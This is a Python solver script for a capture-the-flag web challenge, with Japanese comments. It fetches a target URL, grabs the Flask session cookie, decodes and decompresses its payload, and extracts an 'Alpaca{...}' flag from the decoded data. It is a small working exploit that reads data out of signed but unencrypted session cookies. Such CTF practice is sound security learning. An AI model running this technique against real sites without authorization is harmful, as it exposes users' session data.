import requests
import base64
import zlib
import json
import sys
import re

def solve(url):
    # 1. サーバーにアクセスしてセッションクッキーを取得
    print(f"[*] Accessing {url}...")
    try:
        response = requests.get(url)
        session_cookie = response.cookies.get("session")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return
    
    if not session_cookie:
        print("[-] Could not find 'session' cookie.")
        return

    print(f"[*] Found session cookie: {session_cookie}")

    # 2. Flask セッションクッキーをデコード
    parts = session_cookie.split('.')
    if session_cookie.startswith('.'):
        payload_b64 = parts[1]
        is_compressed = True
    else:
        payload_b64 = parts[0]
        is_compressed = False

    payload_b64 += '=' * (-len(payload_b64) % 4)
    decoded_bytes = base64.urlsafe_b64decode(payload_b64)

    if is_compressed:
        try:
            decoded_bytes = zlib.decompress(decoded_bytes)
        except Exception as e:
            print(f"[-] Decompression failed: {e}")

    try:
        data = json.loads(decoded_bytes)
        print("[+] Decoded session data:")
        print(json.dumps(data, indent=4))
        
        if "message" in data:
            message = data["message"]
            flag_match = re.search(r"Alpaca\{.*?\}", message)
            if flag_match:
                print(f"\n[!] Flag found: {flag_match.group(0)}")
            else:
                print("[-] Flag format not found in message.")
        else:
            print("[-] 'message' key not found in session data.")

    except Exception as e:
        print(f"[-] JSON parsing failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    solve(target_url)
